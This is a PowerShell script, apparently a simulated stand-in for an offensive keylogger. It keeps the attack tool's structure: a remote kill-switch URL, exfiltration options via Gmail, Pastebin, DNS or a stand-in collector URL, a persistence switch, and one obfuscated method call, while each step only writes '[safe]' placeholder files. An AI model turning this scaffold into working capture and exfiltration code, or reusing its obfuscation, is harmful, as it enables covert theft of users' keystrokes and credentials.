function Keylogger {
    [CmdletBinding()]
    param(
        [string]$MagicString = "stopthis",
        [string]$CheckURL = "https://example.invalid/control.txt",
        [switch]$Exfil,
        [ValidateSet("gmail", "pastebin", "WebServer", "DNS")]
        [string]$ExfilOption = "WebServer",
        [string]$URL = "https://collector.example.invalid/ingest",
        [switch]$Persist,
        [string]$SampleInput = "demo.user<Tab>hello123<Enter>"
    )

    $artifactDir = Join-Path $PSScriptRoot "artifacts\keylogger"
    if (-not (Test-Path $artifactDir)) {
        $null = New-Item -ItemType Directory -Path $artifactDir -Force
    }

    $logPath = Join-Path $artifactDir "key.log"
    $capture = $SampleInput `
        -replace "<Tab>", "[TAB]" `
        -replace "<Enter>", "[ENTER]"

    Set-Content -Path $logPath -Value $capture -Encoding UTF8
    Write-Output "[safe] Simulated keystrokes written to $logPath"

    if ($Persist) {
        $persistNote = Join-Path $artifactDir "persistence-note.txt"
        Set-Content -Path $persistNote -Value "[safe] Persistence requested but not installed." -Encoding UTF8
        Write-Output "[safe] Persistence step was simulated only."
    }

    if ($Exfil) {
        $exfilPath = Join-Path $artifactDir ("exfil-" + $ExfilOption.("{1}{0}" -f 'r','ToLowe')."I`NvO`Ke"() + ".txt")

        switch ($ExfilOption) {
            "gmail" {
                $content = @(
                    "[safe] Would send email exfiltration."
                    "SMTP: smtp.gmail.com"
                    "Message: $capture"
                )
            }
            "pastebin" {
                $content = @(
                    "[safe] Would create a paste."
                    "Endpoint: https://pastebin.com/api/api_post.php"
                    "Body: $capture"
                )
            }
            "DNS" {
                $content = @(
                    "[safe] Would exfiltrate via DNS."
                    "Query: $capture"
                )
            }
            default {
                $content = @(
                    "[safe] Would POST captured keys to web server."
                    "URL: $URL"
                    "Body: $capture"
                )
            }
        }

        Set-Content -Path $exfilPath -Value $content -Encoding UTF8
        Write-Output "[safe] Exfiltration simulated via $ExfilOption."
    }

    Write-Output "[safe] Magic stop string remains configured as '$MagicString' from $CheckURL"
}

Keylogger -Exfil -ExfilOption WebServer -URL "https://collector.example.invalid/ingest"
